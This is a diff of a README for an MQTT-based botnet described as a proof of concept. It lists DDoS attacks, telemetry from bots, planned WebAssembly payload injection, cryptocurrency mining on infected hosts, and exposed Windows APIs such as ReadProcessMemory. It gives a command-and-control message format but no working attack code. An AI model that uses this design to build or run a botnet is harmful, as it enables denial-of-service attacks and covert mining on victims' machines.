@@ -3,14 +3,19 @@
 
 Gandalph is MQTT architecture based botnet (Proof Of Concept) with the following and unique features. 
 
-The botmaster client runs in every browser existent, and you could upload your client UI to a server and do cross-requests to the core message broker of the botnet. The bot builder compiles to Mac, Linux, Windows, APK and iOS. 
+The botmaster client runs in every browser, and you could upload your client UI to a server and do cross-requests to the core message broker of the botnet. The bot builder is essentially for Javascript-based DDoS attack. There's some sort of compatibility for desktop platforms but still experimental. Looking to move forward
 
+## What's capable of
 - Telemetry of connected bots in QoS 1 and 2
-- Webassembly module inejction in-the-wild.
-- Cross-platform
+- Running 1000 clients / 30,000 messages per minute avg concurrencies.
+- DDoS attack
+
+## Upcoming
+- Webassembly module injection in-the-wild.
 - Migrate to other message broker core in-the-wild
 - Monero and Electroneum stratum mining pool
-
+- 
+( Implemented in some time in the history of the repo with help of memoryjs but removed )
 About the webassembly module injection, from the view you can upload a .wasm file and got compiled, then uploaded the binary (opcode) via message to the bot
 The return can be checked in logs panel. There's an integrated lib inside the VM that exposes the following WinAPIs in case of windows payload:
 ReadProcessMemory
@@ -73,9 +78,18 @@ $ node main
 | Topic           | PublishOnMessage | Publish                                                                                  | Message                       |
 |-----------------|------------------|------------------------------------------------------------------------------------------|-------------------------------|
 | Admin/browsers  |                  | { headers: { status: '', nonce : '', clientId: ''}, body : { method : '', params: [] } } |                               |
-| Admin/desktop   |                  | { headers: { status: '', nonce: '', clientId: ''}, body: { method : '', params: [] } }   |                               |
-| Bot/{client_id} |                  | { headers: { status: '', nonce: '', apikey: ''}, body: { method: '', params: [] } }      | { status: '', telemetry: {} } |
+| Bot/{client_id} |                  | { headers: { status: '', nonce: '', body: { method: '', params: [] } }                   | { status: '', telemetry: {} } |
 | sonde           | connect          | { client_id : '' , log: '' }                                                             |                               |
+
+#### Topic Bot/{client_id}
+##### Methods
+getTelemetry
+```javascript
+// Publish
+{ method: 'getTelemetry'}
+// Response (message)
+{ status: 'A || B || C', telemetry: {}}
+```
 
 ## Contributing
 Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.
